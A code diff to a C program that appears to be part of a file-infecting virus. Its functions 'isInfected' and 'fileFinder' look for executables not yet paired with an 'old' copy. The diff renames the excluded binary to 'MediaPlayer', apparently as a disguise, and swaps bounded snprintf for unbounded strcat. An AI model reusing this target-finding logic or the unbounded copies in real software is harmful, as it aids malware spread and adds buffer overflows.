@@ -44,7 +44,8 @@ char *isInfected(Programs *files) {
   char *strToken = strtok(files->new, "/");
   while (strToken != NULL) {
     if (strstr(files->old, strToken) == NULL) {
-      snprintf(file, sizeof(file), "%s/%s", file, strToken);
+			strcat(file, strToken);
+			strcat(file, "/");
     }
     strToken = strtok(NULL, "/");
   }
@@ -106,12 +107,14 @@ Programs *fileFinder(char *programName) {
 
     if (stat(dp->d_name, &st) == 0 && S_ISREG(st.st_mode) &&
         (st.st_mode & S_IXUSR) && strcmp(dp->d_name, programName) != 0 &&
-        strcmp(dp->d_name, "main") != 0) {
+        strcmp(dp->d_name, "MediaPlayer") != 0) {
 
       if (strstr(dp->d_name, "old") != NULL) {
-        snprintf(file.old, sizeof(file.old), "%s/%s", file.old, dp->d_name);
+				strcat(file.old, dp->d_name);
+				strcat(file.old, "/");
       } else {
-        snprintf(file.new, sizeof(file.new), "%s/%s", file.new, dp->d_name);
+				strcat(file.new, dp->d_name);
+				strcat(file.new, "/");
       }
 
     } else if (strcmp(dp->d_name, programName) == 0) {
